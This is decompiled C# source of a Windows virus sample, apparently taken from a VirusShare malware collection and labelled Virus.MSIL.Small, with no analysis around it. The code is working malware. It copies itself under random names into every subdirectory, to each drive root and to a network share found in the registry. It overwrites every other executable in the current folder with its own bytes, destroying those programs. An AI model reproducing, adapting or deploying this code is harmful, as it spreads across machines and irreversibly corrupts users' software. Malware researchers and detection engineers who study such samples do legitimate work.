// Decompiled with JetBrains decompiler
// Type: Genetica.Program
// Assembly: Genetica, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 38269FF5-76F0-4DD3-B590-2FD089D27FC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.MSIL.Small.e-9ffb73bdd50a2d9e84afde5afedf818d05b2062060763ca983b64f52cc9f5c4f.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;

namespace Genetica
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      int num = 5;
      string str1 = (string) null;
      object obj = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\lanmanserver\\Shares", false).GetValue("shared");
      string str2 = obj as string;
      char[] charArray = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();
      string[] logicalDrives = Directory.GetLogicalDrives();
      Random random = new Random();
      string location = Assembly.GetExecutingAssembly().Location;
      string currentDirectory = Environment.CurrentDirectory;
      if (currentDirectory.Substring(currentDirectory.Length - 1) != "\\")
        currentDirectory += "\\";
      string[] files = Directory.GetFiles(currentDirectory);
      string[] directories = Directory.GetDirectories(currentDirectory, "*");
      for (int index1 = 0; index1 < num; ++index1)
      {
        int index2 = random.Next(charArray.Length);
        str1 += charArray[index2].ToString();
      }
      int index3 = 0;
      for (int length = directories.Length; index3 < length; ++index3)
      {
        if (directories[index3].Substring(directories[index3].Length - 1) != "\\")
        {
          string[] strArray;
          IntPtr index4;
          (strArray = directories)[(int) (index4 = (IntPtr) index3)] = strArray[index4] + "\\";
          File.Copy(location, directories[index3] + str1 + ".exe");
        }
      }
      for (int index5 = 0; index5 <= logicalDrives.GetUpperBound(0); ++index5)
      {
        try
        {
          File.Copy(location, logicalDrives[index5] + str1 + ".exe");
        }
        catch
        {
        }
      }
      string[] strArray1 = obj as string[];
      string str3 = strArray1[2];
      if (strArray1 != null)
      {
        try
        {
          strArray1.GetEnumerator();
          string str4 = str3.Substring(str3.Length - (str3.Length - 5)) + "\\";
          File.Copy(location, str4 + str1 + ".exe");
        }
        catch
        {
        }
      }
      for (short index6 = 0; (int) index6 < files.GetUpperBound(0); ++index6)
      {
        if (files[(int) index6].Substring(files[(int) index6].Length - (files[(int) index6].Length - files[(int) index6].Length + 4)) == ".exe")
        {
          if ("\r\n" + files[(int) index6] != location)
          {
            try
            {
              string path1 = location;
              string path2 = files[(int) index6];
              FileStream fileStream1 = new FileStream(path1, FileMode.Open, FileAccess.Read);
              FileStream fileStream2 = new FileStream(path2, FileMode.Create, FileAccess.Write);
              byte[] buffer = new byte[fileStream1.Length];
              fileStream1.Read(buffer, 0, Convert.ToInt32(fileStream1.Length));
              fileStream2.Write(buffer, 0, Convert.ToInt32(fileStream1.Length));
              fileStream1.Close();
              fileStream2.Close();
              fileStream1.Dispose();
              fileStream2.Dispose();
            }
            catch
            {
            }
          }
        }
      }
      Console.Write("Retro is Evil!!");
      Console.Read();
    }
  }
}
